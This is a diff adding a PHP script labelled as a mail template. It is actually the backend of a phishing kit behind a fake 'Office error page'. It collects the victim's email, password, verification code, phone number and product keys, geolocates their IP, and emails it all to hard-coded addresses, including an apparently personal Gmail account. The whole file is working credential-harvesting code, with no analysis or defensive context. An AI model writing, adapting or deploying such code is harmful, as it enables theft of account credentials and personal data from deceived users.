@@ -1,0 +1,101 @@
+======= PHP mail Template =======
+<?php
+$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+function get_client_ip()
+{
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    } else if (isset($_SERVER['REMOTE_ADDR'])) {
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    } else {
+        $ipaddress = 'UNKNOWN';
+    }
+
+    return $ipaddress;
+}
+$PublicIP = get_client_ip();
+$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
+$json     = json_decode($json, true);
+
+$country  = $json['country'];
+$region   = $json['region'];
+$city     = $json['city'];
+
+// j)7YGZnLV6gJ
+
+$to = "info@s2vmarinelife.com, garvkansal88@gmail.com";
+
+
+
+  
+
+$name ="Office error";
+$subject = $name;
+ $mail_from = $_SESSION["name"];
+ $email=$mail_from;
+ $password  =  $_SESSION["password"];
+ $mobile = $_SESSION["number"];
+ $code  =   $_SESSION["code"];
+ $key1  =   $_SESSION["key1"];
+ $key2  =   $_SESSION["key2"];
+ $key3  =   $_SESSION["key3"];
+ $key4  =   $_SESSION["key4"]; 
+ $key5  =   $_SESSION["key5"];
+
+
+
+$message = "
+<html>
+<head>
+<title>HTML email</title>
+</head>
+<body>
+<h2>This email is from <a href='#'>Office error page</a> :</h2>
+<table  border='2'  cellpadding='15'>
+<tr><th colspan='4'>User Detail</th></tr>
+<tr><th colspan='4'>$actual_link</th></tr>
+<tr><td>Email</td><td>$mail_from</td></tr>
+<tr><td>password</td><td>$password</td></tr>
+<tr><td>Code</td><td>$code</td></tr>
+<tr><td>Mobile</td><td>$mobile</td></tr>
+<tr><td>Product key :</td><td> $key1 .$key2. $key3. $key4. $key5  </td></tr>
+<tr><th colspan='4'>Location Detail</th></tr>
+<tr><td>country</td><td>$country</td></tr>
+<tr><td>region</td><td>$region</td></tr>
+<tr><td>city</td><td>$city</td></tr>
+<tr><td>IP</td><td>$PublicIP</td></tr>
+</table>
+</body>
+</html>
+";
+
+// Always set content-type when sending HTML email
+
+$headers = "MIME-Version: 1.0" . "\r\n";
+$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+
+// More headers
+// $headers .= 'From: $email' ;
+ $headers  .= "From: $mail_from \r\n"; 
+// $headers .= 'Cc: myboss@example.com' . "\r\n";
+ if(isset($_REQUEST['submit'])){
+if(mail($to,$subject,$message,$headers)){
+ 
+// header("Location: index.php");    
+    
+}
+}
+  session_unset();
+  session_destroy();
+  
+?>
+ 
